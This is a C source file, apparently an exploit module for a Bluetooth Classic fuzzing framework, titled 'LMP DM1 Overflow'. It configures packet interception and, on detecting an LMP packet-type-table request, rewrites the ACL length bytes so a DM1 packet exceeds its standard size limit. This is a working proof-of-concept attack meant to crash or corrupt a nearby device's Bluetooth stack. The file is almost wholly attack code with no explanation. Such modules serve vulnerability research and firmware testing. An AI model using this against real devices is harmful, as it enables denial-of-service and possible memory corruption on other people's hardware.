#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Setup
static const char *module_name()
{
    return "LMP DM1 Overflow";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 2000;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

static uint8_t packet[] = {0x99, 0xec,
                           0x1f, 0xd4, 0xfe, 0xb, 0x1, 0xb3};
// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static uint flag1 = 0;
static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Wait for LMP_packet_type_table_req
    if (pkt_length >= 5 && IS_LMP_EXT_OPCODE(pkt_buf, 11))
    {
        // Change ACL Length to 31 on DM1 channel (which only allows max 17 by standard)
        pkt_buf[2] = 0xFF;
        pkt_buf[3] = 0xd4; // Changing here also works
        return 1;
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}